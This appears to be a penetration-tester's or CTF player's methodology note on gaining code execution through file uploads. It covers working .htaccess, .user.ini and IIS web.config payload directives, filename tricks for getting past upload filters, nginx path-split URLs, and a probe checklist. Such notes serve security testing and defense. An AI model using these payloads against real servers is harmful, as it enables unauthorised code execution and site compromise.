# Server Configs — .htaccess, .user.ini, web.config, mime maps

## The move — change what "is executable" means

When the extension whitelist is airtight, the remaining play is uploading
a **config file** that makes a whitelisted extension executable in the
upload dir.

## Apache `.htaccess` — the classic

Requires `AllowOverride` non-`None` in the upload directory — common on
shared hosting and CTF stacks.

```apache
# make .jpg execute as PHP
AddType application/x-httpd-php .jpg

# or: any extension executes PHP via handler
AddHandler php5-script .xyz

# all files in this dir run as PHP
SetHandler application/x-httpd-php

# CGI route — upload a .sh/.cgi and chmod-exec
Options +ExecCGI
AddHandler cgi-script .jpg

# mod_php per-dir flags — disable a php_flag engine off
php_flag engine on
```

Sequence: upload `.htaccess` (dot-file — a filter that whitelists `*.*`
misses `.htaccess` since there's no extension; a blacklist of `php|htaccess`
may check basename — try `.htaccess.`/`htaccess`/`HtAccess`), then upload
`x.jpg` = GIF89a polyglot, fetch it → executes.

If `.htaccess` is refused outright, `.htaccess` still works if the app
appends a suffix? Some apps force `name.ext` — `htaccess.jpg` is dead
(Apache wants the literal name). Upload `filename=".htaccess"` —
filter splitting on `.` sees empty ext.

## PHP-FPM `.user.ini` — the modern equivalent

`.user.ini` = per-dir php.ini (PHP≥5.3, FastCGI only). Loaded per-dir, only
INI_PERDIR/INI_USER settings apply — but `auto_prepend_file` and
`auto_append_file` ARE per-dir, and that's RCE:

```ini
auto_prepend_file=/var/www/html/uploads/payload.php
; or the self-serve variant — prepend the .jpg "image" itself:
auto_prepend_file=x.jpg
```

`.user.ini` in the upload dir + `x.jpg` containing `<?php ... ?>` —
every PHP response under that dir now runs the payload. Cache note:
`user_ini.cache_ttl` (default 300s) — the config takes effect on next
request or after TTL; retry the fetch.

Same dotfile-filter bypass: `filename=".user.ini"`.

## IIS `web.config` — handler mapping

`web.config` in an upload dir adds handlers for that path:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="aspx" path="*.jpg" verb="*" type=""
           modules="IsapiModule" scriptProcessor="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_isapi.dll"
           resourceType="Unspecified" requireAccess="Script"/>
    </handlers>
    <staticContent>
      <mimeMap fileExtension=".jpg" mimeType="text/html"/>
    </staticContent>
  </system.webServer>
</configuration>
```

`requireAccess`/`handlers` locked by applicationHost.config may refuse
changes → fallback: `staticContent`/`mimeMap` (often unlocked) to make
`.jpg` serve `text/html` → stored-XSS delivery instead of RCE.

Also `.asp`/`web.config` combos: upload `web.config` permitting `.asp`
uploads path, then `.asp` shell.

## Nginx — no per-dir config, but location-confusion wins

Nginx has no `.htaccess` concept — the attacks are the php location-block
shape:

- `x.jpg` under a `location ~ \.php$` tree? No — but `x.jpg/x.php` path
  trick: `fastcgi_split_path_info` splits on `.php` — fetching
  `/uploads/x.jpg/x.php` hands PHP the file path `x.jpg` to execute. Try
  `/uploads/x.jpg/.php`, `/uploads/x.jpg%00.php`,
  `/uploads/x.php/../x.jpg` variants.
- `alias`/`root` confusion: `/uploads../` — `location /uploads` without
  trailing slash + alias can leak parent dir (`/uploads../conf`)
- `merge_slashes` off — `//uploads//x` reaches a different location

Detection: fetch `/uploads/x.jpg/anything.php` — a PHP-processed response
(5xx php error, or execution) vs static 404 tells you if
`fastcgi_split_path_info` is on.

## mime.types / handler-maps — adding an executable mapping

If the app lets you write into its config dir (path-traversal or config-
file upload) — `file-overwrite.md` covers that; the specific trick here is
mapping `.xyz`/`uploaded-ext` to a code handler.

## `index` takeover — `DirectoryIndex` replacement

Upload `index.php`/`index.html` to a dir whose index is configurable —
the dir listing or root URL now serves your file. Index priority:
`DirectoryIndex index.html index.php` — `index.html` usually wins first.
Also `index.svg`, `index.htm`, `index.cgi`.

## `.env` and secrets — a different upload win

If the upload lands somewhere web-served, uploading a *symlinked or
traversed* file isn't needed — but writing `.env`, `wp-config.php`,
`settings.py` via traversal overwrites app config → `file-overwrite.md`.

## Cross-site-include trick — `require` of a remote/mapped file

PHP `allow_url_include` + an upload that lands anywhere readable:
`include('phar://uploads/x.phar/x.php')` or
`include('uploads/x.jpg')` — the .jpg "image" is the script.
`auto_prepend_file` does the same without an include primitive.

## Windows-specific config surface

- `web.config` — above
- `applicationHost.config` — needs the config root, not upload-dir
- `.user.ini` equivalent — none; IIS honors web.config only
- `Global.asax`/`App_Code` overwrite via traversal

## Probe table

```
□ .htaccess accepted?          → AddType x jpg → fetch x.jpg
□ .user.ini accepted?          → auto_prepend_file=x.jpg
□ web.config accepted?         → mimeMap → HTML serve, or handler map
□ fetch /uploads/x.jpg/x.php   → nginx split_path exec?
□ fetch /uploads/x.jpg%00.php  → nginx null-split exec?
□ index.* uploads accepted?    → index.php served at /uploads/ ?
```

## Falsifiers

- uploads land outside any vhost docroot / on object storage — configs
  never read
- `AllowOverride None`, `user_ini.filename` custom or disabled,
  applicationHost `handlers` locked, nginx config sane
- dotfile uploads rejected AND no traversal lands a config name

## Output to record

- which config file was accepted + the directive that fired
- the first URL proving the new mapping executes (verbatim response)
